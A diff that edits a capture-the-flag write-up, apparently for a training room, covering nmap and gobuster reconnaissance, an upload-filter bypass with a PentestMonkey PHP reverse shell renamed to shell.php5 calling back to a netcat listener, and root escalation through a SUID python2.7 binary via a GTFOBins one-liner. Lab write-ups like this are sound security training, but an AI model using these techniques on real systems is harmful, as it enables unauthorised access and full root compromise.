@@ -14,11 +14,13 @@ Once the target machine is deployed, only the IP address is provided. With no pr
 
 With only the target IP address available, the first step is to perform reconnaissance to identify open ports and running services.
 
-## Task 2 – Reconnaisance
+## Task 2 – Reconnaissance
 
 I began by scanning the target using Nmap with the following command:
 
+```bash
 nmap -sC -sV <TARGET_IP>
+```
 
 Explanation:
 
@@ -38,7 +40,9 @@ The presence of an Apache web server indicates that the web application is likel
 
 To discover hidden files and directories hosted by the web server, I performed directory enumeration using Gobuster.
 
+```bash
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
 
 Explanation:
 
@@ -53,7 +57,7 @@ The discovered directories provided valuable information about the web applicati
 
 <img width="737" height="486" alt="panle" src="https://github.com/user-attachments/assets/d547d456-cc1a-4ed9-9e7e-647b07a44265" />
 
-This gives us a /panel directory.
+The enumeration revealed the /panel directory, which contains a file upload functionality.
 
 ## Task 3 - Getting a Shell
 
@@ -74,30 +78,30 @@ PentestMonkey PHP Reverse Shell
 
 Website: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
-Or I use Github 
+Alternatively, the PHP reverse shell is also available on the official PentestMonkey GitHub repository.
 
 GitHub: https://github.com/pentestmonkey/php-reverse-shell
 
 Steps: 
-step 1: Visit the PentestMonkey page.
-step 2: Download the php-reverse-shell.php file.
+Step 1: Visit the PentestMonkey page.
+Step 2: Download the php-reverse-shell.php file.
 
-step 3: Open it in Kali:
+Step 3: Open it in Kali:
 
        nano php-reverse-shell.php
 
-step 4: Modify these lines with your Kali/AttackBox IP and the port you want to listen on:
+Step 4: Modify these lines with your Kali/AttackBox IP and the port you want to listen on:
 
       $ip = 'YOUR_KALI_IP';
       $port = 4444;
       
-step 5: Save the file (Ctrl + O, Enter, Ctrl + X).
+Step 5: Save the file (Ctrl + O, Enter, Ctrl + X).
 
-step 6: Rename it to bypass the upload restriction:
+Step 6: Rename it to bypass the upload restriction:
 
       mv php-reverse-shell.php shell.php5
 
-step 7: Start a Netcat listener:
+Step 7: Start a Netcat listener:
 
       nc -lvnp 4444
       
@@ -105,17 +109,17 @@ Upload shell.php5 through the /panel/ page and then access it from the /uploads/
 
 <img width="712" height="605" alt="Screenshot 2026-07-15 191137" src="https://github.com/user-attachments/assets/a8448087-ec51-42a3-b5cd-e71950a7388c" />
 
-after it get uploaded, click on the shell.php5 file to activate the reverse shell
+After the file is successfully uploaded, navigate to the /uploads directory and click shell.php5 to execute the payload and establish the reverse shell.
 
 <img width="585" height="262" alt="Screenshot 2026-07-15 191212" src="https://github.com/user-attachments/assets/ebbc32e4-bfc8-4ea9-9dbf-121ec685cafb" />
 
 
-got the shell
+A reverse shell was successfully established, providing initial access to the target machine.
 
 <img width="825" height="210" alt="image" src="https://github.com/user-attachments/assets/23b532e6-bac5-4fd0-973c-3441993220da" />
 
 
-I find the user flag in the “/var/www” directory.
+The user flag was located in the /var/www directory and successfully captured.
 
 <img width="219" height="117" alt="image" src="https://github.com/user-attachments/assets/e040ea68-ca79-4dd5-a2d9-5e7a50928c5e" />
 
@@ -129,7 +133,9 @@ A common privilege escalation technique is to search for files with the SUID (Se
 
 To enumerate SUID files, I ran:
 
+```bash
 find / -perm -u=s -type f 2>/dev/null
+```
 
 The output listed several SUID binaries. Among them, /usr/bin/python2.7 stood out as it is known to be exploitable under certain configurations.
 
@@ -141,7 +147,9 @@ To verify whether this binary could be abused, I referred to GTFOBins, a well-kn
 
 The following command was used to spawn a shell while preserving elevated privileges:
 
-     /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```bash
+/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
 
 Upon successful execution, the shell was spawned with root privileges.
 
@@ -173,5 +181,18 @@ The root flag was successfully captured, completing the room.
 
 
 
+## Conclusion
 
+This room demonstrated the complete penetration testing workflow, starting from reconnaissance and web enumeration to exploiting a vulnerable file upload functionality for initial access. After gaining a foothold on the target, SUID enumeration revealed a misconfigured Python binary that could be leveraged to escalate privileges. By exploiting the SUID-enabled Python executable, root access was obtained and both the user and root flags were successfully captured.
 
+## Key Learnings
+
+- Service enumeration with Nmap
+- Directory discovery using Gobuster
+- Exploiting insecure file uploads
+- Gaining initial access with a PHP reverse shell
+- Privilege escalation via SUID binaries
+- Leveraging GTFOBins for root access
+- Capturing the user and root flags
+
+### HAPPY HACKING! 🚀
